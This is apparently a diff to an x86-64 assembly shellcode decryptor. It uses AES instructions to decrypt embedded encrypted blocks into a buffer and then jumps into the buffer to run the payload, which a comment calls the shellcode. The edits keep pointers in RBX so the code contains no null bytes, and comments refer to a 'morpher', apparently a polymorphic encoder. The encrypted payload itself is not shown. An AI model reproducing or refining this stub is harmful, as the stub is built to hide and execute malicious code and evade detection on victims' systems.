@@ -144,7 +144,12 @@ aesdeclast %xmm5,  %xmm0
 movabs $0xffffffffff599999, %rsi
 movabs $0xfffffffffef99689, %rax
 sub %rax, %rsi
+mov %rsi, %rbx
+# we will save our pointer in RBX and not RAX, in order not to have zeroes
 movaps %xmm0, (%rsi)
+# GCC's address could be 0x600900 or 0x6001280 and it could be obtained directly from RDX, so for the morpher we will save the pointer from RDX to RSI, without any additional mathematical operation
+# mov %rdx, %rsi
+# movaps %xmm0, (%rsi)
     
 # second block decryption juste like the first-one
 movabs $0xbe28868e0cb06609, %r14
@@ -166,8 +171,12 @@ aesdec     %xmm7,  %xmm0
 aesdec     %xmm6,  %xmm0
 aesdeclast %xmm5,  %xmm0
 
-# move it after already written 16 bytes
-movaps %xmm0, 16(%rsi)
+# move it after already written 16 bytes, using RBX, so we are not limited by the length (16 will be constant, so no zeroes)
+add $16, %rbx
+movaps %xmm0, (%rbx)
+# however, in the morpher we will use RDX since, it contains the buffer's address
+# add $16, %rdx
+# movaps %xmm0, (%rdx)
 # "Release The Kraken!" I mean, shellcode
 jmpq *%rsi
 
